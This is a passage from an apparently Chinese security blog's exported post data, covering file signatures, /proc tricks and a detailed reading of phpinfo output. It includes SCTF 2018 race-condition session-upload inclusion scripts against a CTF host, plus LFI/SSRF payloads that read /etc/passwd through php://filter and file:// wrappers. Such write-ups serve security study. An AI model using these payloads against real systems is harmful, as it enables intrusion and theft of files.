“WINZIPCompressed”</p>\n<p>FF575047, .wpg, “WordPerfectGraphics”</p>\n<p>FF575043, .wp, “WordPerfect v5 orv6”</p>\n<p>3C3F786D6C,.xml, “XML Document”</p>\n<p>FFFE3C0052004F004F0054005300540055004200, .xml, “XML Document(ROOTSTUB)”</p>\n<p>3C21454E54495459, .dtd, “XML DTD”</p>\n<p>5A4F4F20, .zoo, “ZOO Archive File”</p>\n</li>\n<li><p>如果有fireworks的字样，可以使用Adobe Fireworks打开</p>\n</li>\n<li><p>U2Fsd特征易知是AES加密的密文,使用解密网站，密钥为空</p>\n</li>\n</ol>"},{"title":"proc的作用","date":"2018-06-24T02:55:47.000Z","_content":"\n# proc目录的作用\n\n1. /proc/self/environ              读取环境变量\n\n   该文件会保存http请求头，所以发送恶意User-aget,可以通过文件包含，包含该文件getshell\n\n2. /proc/net/arp                     读取arp\n\n   判断当前局域网存活的主机\n\n3. /proc/self[pid]/cmdline              获得当前运行程序命令行参数\n\n","source":"_posts/proc的作用.md","raw":"---\ntitle: proc的作用\ndate: 2018-06-24 10:55:47\ntags:\n---\n\n# proc目录的作用\n\n1. /proc/self/environ              读取环境变量\n\n   该文件会保存http请求头，所以发送恶意User-aget,可以通过文件包含，包含该文件getshell\n\n2. /proc/net/arp                     读取arp\n\n   判断当前局域网存活的主机\n\n3. /proc/self[pid]/cmdline              获得当前运行程序命令行参数\n\n","slug":"proc的作用","published":1,"updated":"2018-06-25T00:45:33.180Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpf000gly4jteiunio1","content":"<h1 id=\"proc目录的作用\"><a href=\"#proc目录的作用\" class=\"headerlink\" title=\"proc目录的作用\"></a>proc目录的作用</h1><ol>\n<li><p>/proc/self/environ              读取环境变量</p>\n<p>该文件会保存http请求头，所以发送恶意User-aget,可以通过文件包含，包含该文件getshell</p>\n</li>\n<li><p>/proc/net/arp                     读取arp</p>\n<p>判断当前局域网存活的主机</p>\n</li>\n<li><p>/proc/self[pid]/cmdline              获得当前运行程序命令行参数</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"proc目录的作用\"><a href=\"#proc目录的作用\" class=\"headerlink\" title=\"proc目录的作用\"></a>proc目录的作用</h1><ol>\n<li><p>/proc/self/environ              读取环境变量</p>\n<p>该文件会保存http请求头，所以发送恶意User-aget,可以通过文件包含，包含该文件getshell</p>\n</li>\n<li><p>/proc/net/arp                     读取arp</p>\n<p>判断当前局域网存活的主机</p>\n</li>\n<li><p>/proc/self[pid]/cmdline              获得当前运行程序命令行参数</p>\n</li>\n</ol>\n"},{"title":"phpinfo解读","date":"2018-05-22T06:35:41.000Z","password":654321,"_content":"\n# phpinfo解读\n\n<!--more-->\n\n我们以 [链接：](http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php)[phpinfo()](http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php) 为例来讲解吧。\n\n## 版本更迭\n\nphpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。\n\n PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：\n\n1. 移除不支持SQL预编译的Mysql扩展：mysql \n2. 移除preg_replace中容易导致代码执行漏洞的正则模式：e \n3. assert从一个函数变成一个语法结构（类似eval，无法再动态调用。至此，大量PHP一句话木马将失效），7.2中废弃字符串形式的参数 \n4. hex字符串（如0xf4c3b00c）不再被作为数字，is_numeric也不再认可，可见 [链接：https://3v4l.org/ORuc7](https://3v4l.org/ORuc7) \n5. 7.2中废弃可以动态执行字符串的 create_function \n6. 7.2中废弃容易导致变量覆盖的无第二个参数的parse_str \n7. 移除`<script language=\"php\"\\>`和`<%`，这两种另类的PHP标签 \n8. 移除dl函数\n\n这里是关于PHP版本支持的一些说明 [链接：](http://php.net/supported-versions.php)[PHP: Supported Versions](http://php.net/supported-versions.php) PHP5从5.2到5.6，其实也做了很多改进，以前分享过一篇文章 [链接：](http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html)[php各版本的姿势(2017-02-15更新) - l3m0n - 博客园](http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html) 大家可以再温故一下，我就不再介绍了。\n\n和版本有关的一些tricks：\n\n- [链接：](https://tricking.io/card/26/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/26/description) - \n- [链接：](https://tricking.io/card/24/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/24/description) - \n- [链接：](https://tricking.io/card/2/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/2/description) \n\n这个两个在线工具可以用来在PHP多版本（包括小版本）中执行代码，进而比较他们之前的区别： \n\n- [链接：](https://3v4l.org/)[Online PHP editor | Run code in 200  PHP & HHVM ve...](https://3v4l.org/) \n- [链接：](http://sandbox.onlinephpfunctions.com/)[PHP Sandbox, test PHP online, PHP tester](http://sandbox.onlinephpfunctions.com/)\n\n## php.ini\n\n图1中的四项配置，与php.ini有关。\n\n图一:\n\n![](https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png)\n\n php.ini是php的配置文件，但其实并不一定每个php环境都会有这个文件。比如我图1中的这个环境，其“Loaded Configuration File”的值是“(none)”，其实就是没有。如果我们没有指定php.ini文件，那么php的所有配置都会使用默认配置。 \n\n这里有一点值得注意，那就是“默认配置”的含义： \n\n1. 没有任何php.ini时，某个配置项默认的值 \n2. 用apt等源管理工具安装php后，默认php.ini里配置的值 \n\n上述两个“默认配置”在大部分情况下是相同的，但还是有些许不同。 举个简单的例子，配置项request_order用来指定PHP的\\$_REQUEST变量以何种顺序取值。《Discuz! 6.x/7.x 全局变量防御绕过导致代码执行》（ [链接：](https://www.secpulse.com/archives/2338.html)[Discuz! 6.x/7.x 全局变量防御绕过导致命令执行 - SecPulse.COM | 安全...](https://www.secpulse.com/archives/2338.html) ） 就与这个配置有关。 (Discuz那个链接看着有点迷糊，我看的这个[链接：](http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html)[Discuz!某两个版本前台产品命令执行（无需登录） | WooYun-2014-80723 | W...](http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html))。\n\n文中提到，因为PHP5.3以后request_order的默认值变成GP，不再包含\\$\\_COOKIE，所以导致通过\\$_COOKIE来覆盖变量，造成代码执行。\n\n 其实文中说的request_order默认值变成GP，指的是第2种情况。也就是说，如果一个完全没有任何php.ini文件的php环境，其默认的request_order，仍然是GPC，而非GP。 我们可以来实验一下，首先用docker启动一个php环境（docker的php环境是没有php.ini的）： \n\n> docker run --rm --name php1 -it -p 8080:80 -v `pwd`:/var/www/html php:7.2-apache \n\n再用docker启动一个默认的debian环境，并用apt源安装php5：\n\n> docker run --rm --name php2 -it -p 8081:80 -v `pwd`:/var/www/html debian:8 bash apt-get update && apt-get install -y php5 \n>\n> php -S 0.0.0.0:80 -t /var/www/html \n\n然后，我们输出一下两个环境的request_order取值，以及\\$\\_REQUEST变量：图2。 可见，在request_order为空的时候，\\$\\_REQUEST可以取到$_COOKIE中的值；而request_order=GP的时候，就已经取不到了。我们查看第二个环境的php.ini文件，也可以看到request_order的取值：图3。\n\n 所以，这两种默认值的含义，需要区分清楚，避免出现错误。\n\n图二:\n\n![](https://file.zsxq.com/1d6/59/d659ac1a237468325de98f2cfc0802548d77e8a7ebd9d1a80d0390d2d0b2b7e2.png)\n\n图三:\n\n![](https://file.zsxq.com/164/c8/64c85402cb752d1d7a5a2fbec6bf434338de9526b3836c08c28cb9382609a720.png)\n\nwin10: 本地win10+phpstudy+apache中5.3.29-nts与5.4.45-nts中的requests_order方式是\"CGP\"\n\n除了默认php配置，还有两个配置项我没说。在编译PHP的时候，我们可以指定--with-config-file-path和--with-config-file-scan-dir。`\n\n 这两个配置项的意思是，PHP会在--with-config-file-path指定的目录下寻找php.ini文件，如果找到则加载之；除此之外，PHP还会在--with-config-file-scan-dir指定的目录下，寻找所有以.ini为后缀的文件，加载其为配置文件，这个配置是可以覆盖php.ini中配置的。 所以，通常用apt-get install php-pdo来安装php扩展，都会在--with-config-file-scan-dir下写入新的配置文件，而不是修改php.ini。 \n\n这样，我们如果遇到phpinfo页面，即可用过这两个配置项，来定位php.ini以及额外配置文件的位置。甚至来说，如果这两个目录可写，我们就能写入自己的php配置，进而达成跨站、提权等目的。\n\n图四:\n\n![](https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png)\n\n\n\n## SAPI\n\n见图5，Server API 指的是当前PHP运行在哪一种模式下。SAPI是PHP内核的一个概念，相当于是PHP核心解释器和应用层（如Web中间件）的一个桥梁。我们需要在SAPI里实现一些函数，供PHP底层调用。 \n\n这篇文章（ [链接：](https://foio.github.io/php-sapi/)[理解php内核中SAPI的作用 – 积木村の研究所](https://foio.github.io/php-sapi/) ）里举了个简单的例子：cli和cgi这两个SAPI，均需要实现sapi_cgi_read_cookies函数，但cli模式下没有cookie，所以该函数返回null；cgi模式下，cookie从HTTP头中获取，所以返回的是getenv(\"HTTP_COOKIE\")。 \n\n下面介绍一些常用的SAPI。 图5中的FPM/FastCGI指的就是一种SAPI，其提供了一种以fastcgi协议和Web中间件（如Nginx）通信的接口，具体流程可以阅读我的这篇文章（ [链接：](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写 | 离别歌](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)  ）。\n\n图5:\n\n![](https://file.zsxq.com/1a0/72/a072352975fb3a7f091f12f1f51c359d246c1ea1dded3a33be4300fc81d143c8.png)\n\n PHP为Apache提供了一个专用了SAPI——Apache 2.0 Handler。相当于是把PHP编译成一个动态链接库，作为Apache的一个模块。\n\n 当然，Apache也不一定必须用这种SAPI，他同样也支持用Fastcgi和PHP-FPM通信。所以，即使你在实战中遇到了服务器是Apache的环境，也不能就此认定其一定存在Apache模块。你可以尝试下载一个PHPStudy，来看看是否有apache_get_version函数，答案是否定的。 我们平时在命令行里运行PHP，比如php -i （在命令行下执行phpinfo的方法），你可以看到此时的Server API是“Command Line Interface”：图6。\n\n图6:\n\n![](https://file.zsxq.com/1b6/61/b661242ec92dae5334dd695b75c7a3ad2f8a028c8cbc59151eec9230cc7d9a45.png)\n\n这个SAPI就是给命令行用的。 \n\n另外，PHP5.4及以后，我们可以用 php -S localhost:8080 来启动PHP内置的Web server。这个Web server其实也是一个SAPI，名为“Built-in HTTP server”：图7。 \n\n图7:\n\n![PHP](https://file.zsxq.com/1b2/bb/b2bbf2fcb9f5d5088f55dc290570ba84f8c0cc86af9786bbaa5b02b77372fdb8.png) \n\nBuilt-in Server相当于实现了一个Web文件服务器，然后将PHP有关的请求发给“Built-in HTTP server”这个SAPI，最终交给解释器解析。 \n\n在很古老的时候，rfc3875（ [链接：http://www.ietf.org/rfc/rfc3875](http://www.ietf.org/rfc/rfc3875) ）定义了一种运行Web应用的方法——CGI，PHP也为其提供了名为“CGI/FastCGI”的SAPI，不过用的比较少，不介绍了。 \n\n除此之外，还有一个比较有意思的SAPI，叫embed，这是一个嵌入式SAPI。这个功能就很有意思了，我们能很容易地将PHP解释器集成到自己的程序里。比如Laruence在08年曾写过一篇《使用PHP Embed SAPI实现Opcodes查看器》的文章：[链接：](http://www.laruence.com/2008/09/23/539.html)[使用PHP Embed SAPI实现Opcodes查看器 | 风雪之隅](http://www.laruence.com/2008/09/23/539.html) 。 \n\n原理也比较简单，就是在外部调用PHP内核的zend_compile_file函数，将代码转换成OPCODE，然后输出。\n\n uwsgi的PHP插件，也是利用内嵌embed的PHP，我们可以在 [链接：](https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile)[vulhub/Dockerfile at master · vulhub/vulhub · GitH...](https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile) 看到整个编译的过程。 \n\nphpdbg是php5.4及以后加入的一个php交互式调试器，他也是一个sapi。\n\n## php支持的协议\n\n图8，Registered PHP Streams中列出了PHP默认支持的一些协议。 我们来一一介绍一下。 \n\nhttps和http自然不用说，用来包装http协议，我们可以执行readfile('[链接：](http://www.example.com/)[Example Domain](http://www.example.com/)');来发送一个http请求。 \n\nftps和ftp，用来包装ftp协议，和http类似。 \n\ncompress.zlib用来处理zlib压缩过的数据，比如我们可以用readfile('compress.zlib://file.gz');来读取用zlib压缩过的文件。 \n\nphp是php特有的协议，用其可以访问输入输出流，并进行过滤、编码等操作。其支持的功能有很多，可以参考这个文档：[链接：](http://php.net/manual/zh/wrappers.php.php)[PHP: php:// - Manual](http://php.net/manual/zh/wrappers.php.php) \n\nfile用来访问本地文件，比如readfile('file:///etc/passwd');\n\n glob用来以模式匹配的方式访问本地目录，比如 dir('glob:///etc/*')。 \n\ndata可以用url的方式来模拟一个输入流（RFC 2397），比如，readfile通常是用来读取文件中的内容，但我们可以通过 readfile('data://text/plain;base64,SGVsbG8='); 来解码base64串，并将其作为输入流读取。 \n\nphar是用来读写PHP归档，PHP归档类似于Java的.jar文件，我们可以将一个完整的PHP项目（可能包含数百个文件）打包成一个.phar，比如composer.phar。phar流就负责读写这个文件。\n\n 除此之外，常见的协议还有zip://，用来读写zip格式的压缩文件；\n\ncompress.bzip2://用来读写bz2压缩的文件。这些协议可能需要额外安装扩展。\n\n另外，用户也可以定义自己的流，即实现streamWrapper类中的方法，这块我就不介绍了。\n\n图8:\n\n![](https://file.zsxq.com/179/b6/79b6f16973ae9a0c370e62e0f7fa11f401121107e39d1ac9bc0e6a486ba8075d.png)\n\n## Registered Stream Filters\n\nRegistered Stream Filters列出了一些默认支持的filter流。（图9） 其实PHP中的filter流，是和协议密不可分的。协议的作用是读写文件（包括正常文件、目录、输入输出等），而filter流的作用就是在读写的中途对数据进行过滤和编码，相当于是一个HOOK。 \n\nzlib.\\*用来压缩和解压数据，和compress.zlib://协议不同的是，用zlib流可以压缩、解压任何其他协议里传输的数据。 \n\nconvert.iconv.\\*用来转换编码。 \n\nstring.\\*用来做字符串转换，比如string.strip_tags用来去除字符串中的标签，string.tolower用来将字符串转换成小写。 \n\nconvert.\\*用来转换数据，比如用convert.base64-decode可以做base64的解码。其实我觉得放在string.*里也可以。 \n\ndechunk用来处理chunk相关的数据，chunk是HTTP1.1中传输流式数据的方式（ [链接：](https://en.wikipedia.org/wiki/Chunked_transfer_encoding)[Chunked transfer encoding - Wikipedia](https://en.wikipedia.org/wiki/Chunked_transfer_encoding) ），用这个filter流就能将chunk解开。 consumed应该是用来计算数据字符数量的。\n\n 在PHP里，我们可以用stream_filter_append函数将上述流，附加在某个输入输出资源上。当然，更常见的用法是，我们可以用php://filter协议来使用上述流，比如 readfile('php://filter/read=convert.base64-encode/resource=/etc/passwd'); 关于php://filter的一些有趣的技巧，可以阅读这篇文章 [链接：](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)[谈一谈php://filter的妙用 | 离别歌](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)  。\n\n图9:\n\n![](https://file.zsxq.com/142/62/426224a833018047b952319a5e72bea0f85227707d522c748fa533acf12f6b17.png)\n\n## session uplaod\n\n图10:\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7ddab932-75fc-1.png)\n\n`session.upload_progress.enabled = on` 说明可以覆盖session\n\n`clean up`说明需要竞争\n\n图11：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dcda382-75fc-1.png)\n\nsessionupload.py\n\n```\n#!coding:utf-8\nimport requests\nimport time\n\nurl = 'http://116.62.71.206:52872/?f=login.php'\ndata = {'name':'admin','pass':'sctf2018_h656cDBkU2'}\n\nr = requests.post(url,data = data)\nPHPSESSID = r.cookies['PHPSESSID']\nprint 'input the PHPSESSID in include.py' +'\\n' + PHPSESSID\ntime.sleep(10)\n\nwhile 1:\n    url = 'http://116.62.71.206:52872/?f=upload_sctf2018_C9f7y48M75.php'\n    files = { \n    \"PHP_SESSION_UPLOAD_PROGRESS\" : (None,'<?php echo file_get_contents(\"/tmp/flag_56CcE97QGNxDEXNpW3HY\");?>'),  \n\n    \"upload\" : (\"tmp.jpg\", open(\"tmp.png\", \"rb\"), \"image/png\"), \n\n    \"submit\" : (None,\"submit\")\n    }  \n    #proxies = {'http':'http://127.0.0.1:8080'}\n    headers = {'Cookie':'PHPSESSID=' + PHPSESSID}\n    r = requests.post(url,files = files , headers = headers)\n    print r.text\n    print PHPSESSID\n    #开了cleanup，需要竞争，并且保持回话的session\n```\n\ninclude.py\n\n```\n#!coding:utf-8\n\nimport requests\nPHPSESSID = 'qc2kavokdjiiepu283hduivod2'\nwhile 1:\n    url = 'http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_' + PHPSESSID\n    print url\n    r = requests.get(url)\n    if 'SCTF' in r.text:\n        print r.text\n        break\n```\n\n\n\n## 案例\n\n以前我在博客里讲过不少和协议有关的安全tricks，大家也分享过一些，今天来温故一下。 \n\n利用php filter绕过死亡exit：[链接：](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)[谈一谈php://filter的妙用 | 离别歌](https://www.leavesongs.com/PENETRATION/php-filter-magic.html) \n\n利用phar/zip协议绕过有后缀的文件包含：include zip:///var/www/html/upload/1.gif#1.php \n\n利用curl+gopher协议进行SSRF漏洞利用： [链接：](http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html)[Do Evil Things with gopher://](http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html) \n\nSSRF检查host时进行文件读取：file://localhost/etc/passwd \n\n利用php协议+zlib.inflate流压缩数据，突破libxml解析器限制的实体长度 \n\nphp://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd","source":"_posts/phpinfo解读.md","raw":"---\ntitle: phpinfo解读\ndate: 2018-05-22 14:35:41\ntags:\npassword: 654321\n---\n\n# phpinfo解读\n\n<!--more-->\n\n我们以 [链接：](http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php)[phpinfo()](http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php) 为例来讲解吧。\n\n## 版本更迭\n\nphpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。\n\n PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：\n\n1. 移除不支持SQL预编译的Mysql扩展：mysql \n2. 移除preg_replace中容易导致代码执行漏洞的正则模式：e \n3. assert从一个函数变成一个语法结构（类似eval，无法再动态调用。至此，大量PHP一句话木马将失效），7.2中废弃字符串形式的参数 \n4. hex字符串（如0xf4c3b00c）不再被作为数字，is_numeric也不再认可，可见 [链接：https://3v4l.org/ORuc7](https://3v4l.org/ORuc7) \n5. 7.2中废弃可以动态执行字符串的 create_function \n6. 7.2中废弃容易导致变量覆盖的无第二个参数的parse_str \n7. 移除`<script language=\"php\"\\>`和`<%`，这两种另类的PHP标签 \n8. 移除dl函数\n\n这里是关于PHP版本支持的一些说明 [链接：](http://php.net/supported-versions.php)[PHP: Supported Versions](http://php.net/supported-versions.php) PHP5从5.2到5.6，其实也做了很多改进，以前分享过一篇文章 [链接：](http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html)[php各版本的姿势(2017-02-15更新) - l3m0n - 博客园](http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html) 大家可以再温故一下，我就不再介绍了。\n\n和版本有关的一些tricks：\n\n- [链接：](https://tricking.io/card/26/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/26/description) - \n- [链接：](https://tricking.io/card/24/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/24/description) - \n- [链接：](https://tricking.io/card/2/description)[梧桐百科 - 碎片化知识学习](https://tricking.io/card/2/description) \n\n这个两个在线工具可以用来在PHP多版本（包括小版本）中执行代码，进而比较他们之前的区别： \n\n- [链接：](https://3v4l.org/)[Online PHP editor | Run code in 200  PHP & HHVM ve...](https://3v4l.org/) \n- [链接：](http://sandbox.onlinephpfunctions.com/)[PHP Sandbox, test PHP online, PHP tester](http://sandbox.onlinephpfunctions.com/)\n\n## php.ini\n\n图1中的四项配置，与php.ini有关。\n\n图一:\n\n![](https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png)\n\n php.ini是php的配置文件，但其实并不一定每个php环境都会有这个文件。比如我图1中的这个环境，其“Loaded Configuration File”的值是“(none)”，其实就是没有。如果我们没有指定php.ini文件，那么php的所有配置都会使用默认配置。 \n\n这里有一点值得注意，那就是“默认配置”的含义： \n\n1. 没有任何php.ini时，某个配置项默认的值 \n2. 用apt等源管理工具安装php后，默认php.ini里配置的值 \n\n上述两个“默认配置”在大部分情况下是相同的，但还是有些许不同。 举个简单的例子，配置项request_order用来指定PHP的\\$_REQUEST变量以何种顺序取值。《Discuz! 6.x/7.x 全局变量防御绕过导致代码执行》（ [链接：](https://www.secpulse.com/archives/2338.html)[Discuz! 6.x/7.x 全局变量防御绕过导致命令执行 - SecPulse.COM | 安全...](https://www.secpulse.com/archives/2338.html) ） 就与这个配置有关。 (Discuz那个链接看着有点迷糊，我看的这个[链接：](http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html)[Discuz!某两个版本前台产品命令执行（无需登录） | WooYun-2014-80723 | W...](http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html))。\n\n文中提到，因为PHP5.3以后request_order的默认值变成GP，不再包含\\$\\_COOKIE，所以导致通过\\$_COOKIE来覆盖变量，造成代码执行。\n\n 其实文中说的request_order默认值变成GP，指的是第2种情况。也就是说，如果一个完全没有任何php.ini文件的php环境，其默认的request_order，仍然是GPC，而非GP。 我们可以来实验一下，首先用docker启动一个php环境（docker的php环境是没有php.ini的）： \n\n> docker run --rm --name php1 -it -p 8080:80 -v `pwd`:/var/www/html php:7.2-apache \n\n再用docker启动一个默认的debian环境，并用apt源安装php5：\n\n> docker run --rm --name php2 -it -p 8081:80 -v `pwd`:/var/www/html debian:8 bash apt-get update && apt-get install -y php5 \n>\n> php -S 0.0.0.0:80 -t /var/www/html \n\n然后，我们输出一下两个环境的request_order取值，以及\\$\\_REQUEST变量：图2。 可见，在request_order为空的时候，\\$\\_REQUEST可以取到$_COOKIE中的值；而request_order=GP的时候，就已经取不到了。我们查看第二个环境的php.ini文件，也可以看到request_order的取值：图3。\n\n 所以，这两种默认值的含义，需要区分清楚，避免出现错误。\n\n图二:\n\n![](https://file.zsxq.com/1d6/59/d659ac1a237468325de98f2cfc0802548d77e8a7ebd9d1a80d0390d2d0b2b7e2.png)\n\n图三:\n\n![](https://file.zsxq.com/164/c8/64c85402cb752d1d7a5a2fbec6bf434338de9526b3836c08c28cb9382609a720.png)\n\nwin10: 本地win10+phpstudy+apache中5.3.29-nts与5.4.45-nts中的requests_order方式是\"CGP\"\n\n除了默认php配置，还有两个配置项我没说。在编译PHP的时候，我们可以指定--with-config-file-path和--with-config-file-scan-dir。`\n\n 这两个配置项的意思是，PHP会在--with-config-file-path指定的目录下寻找php.ini文件，如果找到则加载之；除此之外，PHP还会在--with-config-file-scan-dir指定的目录下，寻找所有以.ini为后缀的文件，加载其为配置文件，这个配置是可以覆盖php.ini中配置的。 所以，通常用apt-get install php-pdo来安装php扩展，都会在--with-config-file-scan-dir下写入新的配置文件，而不是修改php.ini。 \n\n这样，我们如果遇到phpinfo页面，即可用过这两个配置项，来定位php.ini以及额外配置文件的位置。甚至来说，如果这两个目录可写，我们就能写入自己的php配置，进而达成跨站、提权等目的。\n\n图四:\n\n![](https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png)\n\n\n\n## SAPI\n\n见图5，Server API 指的是当前PHP运行在哪一种模式下。SAPI是PHP内核的一个概念，相当于是PHP核心解释器和应用层（如Web中间件）的一个桥梁。我们需要在SAPI里实现一些函数，供PHP底层调用。 \n\n这篇文章（ [链接：](https://foio.github.io/php-sapi/)[理解php内核中SAPI的作用 – 积木村の研究所](https://foio.github.io/php-sapi/) ）里举了个简单的例子：cli和cgi这两个SAPI，均需要实现sapi_cgi_read_cookies函数，但cli模式下没有cookie，所以该函数返回null；cgi模式下，cookie从HTTP头中获取，所以返回的是getenv(\"HTTP_COOKIE\")。 \n\n下面介绍一些常用的SAPI。 图5中的FPM/FastCGI指的就是一种SAPI，其提供了一种以fastcgi协议和Web中间件（如Nginx）通信的接口，具体流程可以阅读我的这篇文章（ [链接：](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写 | 离别歌](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)  ）。\n\n图5:\n\n![](https://file.zsxq.com/1a0/72/a072352975fb3a7f091f12f1f51c359d246c1ea1dded3a33be4300fc81d143c8.png)\n\n PHP为Apache提供了一个专用了SAPI——Apache 2.0 Handler。相当于是把PHP编译成一个动态链接库，作为Apache的一个模块。\n\n 当然，Apache也不一定必须用这种SAPI，他同样也支持用Fastcgi和PHP-FPM通信。所以，即使你在实战中遇到了服务器是Apache的环境，也不能就此认定其一定存在Apache模块。你可以尝试下载一个PHPStudy，来看看是否有apache_get_version函数，答案是否定的。 我们平时在命令行里运行PHP，比如php -i （在命令行下执行phpinfo的方法），你可以看到此时的Server API是“Command Line Interface”：图6。\n\n图6:\n\n![](https://file.zsxq.com/1b6/61/b661242ec92dae5334dd695b75c7a3ad2f8a028c8cbc59151eec9230cc7d9a45.png)\n\n这个SAPI就是给命令行用的。 \n\n另外，PHP5.4及以后，我们可以用 php -S localhost:8080 来启动PHP内置的Web server。这个Web server其实也是一个SAPI，名为“Built-in HTTP server”：图7。 \n\n图7:\n\n![PHP](https://file.zsxq.com/1b2/bb/b2bbf2fcb9f5d5088f55dc290570ba84f8c0cc86af9786bbaa5b02b77372fdb8.png) \n\nBuilt-in Server相当于实现了一个Web文件服务器，然后将PHP有关的请求发给“Built-in HTTP server”这个SAPI，最终交给解释器解析。 \n\n在很古老的时候，rfc3875（ [链接：http://www.ietf.org/rfc/rfc3875](http://www.ietf.org/rfc/rfc3875) ）定义了一种运行Web应用的方法——CGI，PHP也为其提供了名为“CGI/FastCGI”的SAPI，不过用的比较少，不介绍了。 \n\n除此之外，还有一个比较有意思的SAPI，叫embed，这是一个嵌入式SAPI。这个功能就很有意思了，我们能很容易地将PHP解释器集成到自己的程序里。比如Laruence在08年曾写过一篇《使用PHP Embed SAPI实现Opcodes查看器》的文章：[链接：](http://www.laruence.com/2008/09/23/539.html)[使用PHP Embed SAPI实现Opcodes查看器 | 风雪之隅](http://www.laruence.com/2008/09/23/539.html) 。 \n\n原理也比较简单，就是在外部调用PHP内核的zend_compile_file函数，将代码转换成OPCODE，然后输出。\n\n uwsgi的PHP插件，也是利用内嵌embed的PHP，我们可以在 [链接：](https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile)[vulhub/Dockerfile at master · vulhub/vulhub · GitH...](https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile) 看到整个编译的过程。 \n\nphpdbg是php5.4及以后加入的一个php交互式调试器，他也是一个sapi。\n\n## php支持的协议\n\n图8，Registered PHP Streams中列出了PHP默认支持的一些协议。 我们来一一介绍一下。 \n\nhttps和http自然不用说，用来包装http协议，我们可以执行readfile('[链接：](http://www.example.com/)[Example Domain](http://www.example.com/)');来发送一个http请求。 \n\nftps和ftp，用来包装ftp协议，和http类似。 \n\ncompress.zlib用来处理zlib压缩过的数据，比如我们可以用readfile('compress.zlib://file.gz');来读取用zlib压缩过的文件。 \n\nphp是php特有的协议，用其可以访问输入输出流，并进行过滤、编码等操作。其支持的功能有很多，可以参考这个文档：[链接：](http://php.net/manual/zh/wrappers.php.php)[PHP: php:// - Manual](http://php.net/manual/zh/wrappers.php.php) \n\nfile用来访问本地文件，比如readfile('file:///etc/passwd');\n\n glob用来以模式匹配的方式访问本地目录，比如 dir('glob:///etc/*')。 \n\ndata可以用url的方式来模拟一个输入流（RFC 2397），比如，readfile通常是用来读取文件中的内容，但我们可以通过 readfile('data://text/plain;base64,SGVsbG8='); 来解码base64串，并将其作为输入流读取。 \n\nphar是用来读写PHP归档，PHP归档类似于Java的.jar文件，我们可以将一个完整的PHP项目（可能包含数百个文件）打包成一个.phar，比如composer.phar。phar流就负责读写这个文件。\n\n 除此之外，常见的协议还有zip://，用来读写zip格式的压缩文件；\n\ncompress.bzip2://用来读写bz2压缩的文件。这些协议可能需要额外安装扩展。\n\n另外，用户也可以定义自己的流，即实现streamWrapper类中的方法，这块我就不介绍了。\n\n图8:\n\n![](https://file.zsxq.com/179/b6/79b6f16973ae9a0c370e62e0f7fa11f401121107e39d1ac9bc0e6a486ba8075d.png)\n\n## Registered Stream Filters\n\nRegistered Stream Filters列出了一些默认支持的filter流。（图9） 其实PHP中的filter流，是和协议密不可分的。协议的作用是读写文件（包括正常文件、目录、输入输出等），而filter流的作用就是在读写的中途对数据进行过滤和编码，相当于是一个HOOK。 